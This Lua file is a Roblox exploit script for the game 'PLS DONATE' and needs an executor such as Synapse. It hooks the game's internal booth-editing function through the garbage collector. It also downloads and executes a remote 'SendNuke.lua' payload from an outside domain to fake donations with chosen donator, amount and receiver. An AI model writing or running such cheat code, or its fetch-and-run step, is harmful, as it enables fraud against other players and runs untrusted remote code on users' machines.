local CollectionService = game:GetService("CollectionService")
local functions = {}
functions.updateBoothText = function() return end
functions.boothText = ""
functions.boothTextBox = game:GetService("Players").LocalPlayer.PlayerGui.ScreenGui.EditBooth.TextBox
functions.Donator = game.Players.LocalPlayer.Name
functions.Amount = 100000
functions.Reciever = game.Players.LocalPlayer.Name:reverse()

function functions:GetFunctions()
	for i, v in next, getgc() do
		if typeof(v) == "function" and islclosure(v) then
			if not is_synapse_function(v) then
				local name = debug.getinfo(v).name
				if name == "applyEditBooth" then
					self.updateBoothText = v
				end
			end
		end
	end
    self.nukeFunction = loadstring(game:HttpGet("https://www.soggy-ware.cf/Side/SendNuke.lua"))()
end

function functions:Nuke(donator, amount, reciever)
    self.nukeFunction(donator, amount, reciever)()
end

function functions:SetText()
	self.boothTextBox.Text = self.boothText or "nil"
	self.updateBoothText()
end

function functions:SetBoothText(text)
	self.boothText = text
	self.boothTextBox.Text = self.boothText
end

function functions:BoothTextTypingEffect(text)
	self.boothText = text
	self.boothTextBox.Text = ""
	task.spawn(function()
		for i = 1, self.boothText:len() do
			self.boothTextBox.Text = self.boothTextBox.Text .. self.boothText:sub(i, i)
			task.wait(1)
			self.updateBoothText()
		end
	end)
end

function functions:SetColourOfText(text, colour)
	self.boothText = [[<font color="rgb(]] .. tostring(math.floor(colour.r * 255)) .. "," .. tostring(math.floor(colour.g * 255)) .. "," .. tostring(math.floor(colour.b * 255)) .. [[)"]] .. [[>]] .. text .. [[</font>]]
	print(self.boothText)
	self:SetText()
end

functions.Colour = {
	123,
	12,
	31
}

function functions:Init()
	self:GetFunctions()

    local SolarisLib = loadstring(game:HttpGet("https://raw.githubusercontent.com/Stebulous/solaris-ui-lib/main/source.lua"))()
	
    local win = SolarisLib:New({
		Name = "PLS DONATE",
		FolderToSave = "PLS DONATE"
	})

	local tab = win:Tab("Tab 1")

	local sec = tab:Section("Main")

	sec:Textbox("Booth Text", false, function(t)
		self.boothText = t
	end)

	sec:Colorpicker("Set Colour Text", Color3.fromRGB(255, 255, 255), "Colorpicker", function(t)
		self.Colour = t
	end)

	sec:Button("Set Booth Text", function()
		self:SetColourOfText(self.boothText, self.Colour)
	end)

    local sec = tab:Section("Donations")

    sec:Button("Send Donation", function()
		self:Nuke(self.Donator, self.Amount, self.Reciever)
	end)

    sec:Textbox("Donator", false, function(t)
		self.Donator = t
	end)

    sec:Textbox("Amount", false, function(t)
		self.Amount = tonumber(t)
	end)

    sec:Textbox("Reciever", false, function(t)
		self.Reciever = t
	end)

	task.spawn(function()
		while task.wait(10) do
			self.boothText = game.Players.LocalPlayer.Name
		end
	end)
end

functions:Init()